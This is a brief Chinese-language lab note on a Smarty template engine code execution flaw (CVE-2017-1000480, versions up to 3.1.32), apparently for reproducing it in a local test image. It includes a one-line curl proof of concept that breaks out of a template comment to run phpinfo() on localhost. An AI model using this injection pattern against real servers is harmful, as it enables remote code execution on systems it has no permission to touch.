## 代码执行漏洞

测试镜像

* src/smarty/3.1.20/

影响版本

* <= 3.1.32

参考链接

* [Smarty <= 3.1.32 代码执行漏洞分析—【CVE-2017-1000480】](https://mp.weixin.qq.com/s/MkXv1wU9qIfyGq4izH2VwQ)

Poc

```
curl http://127.0.0.1/?test=*/;phpinfo();/*
```

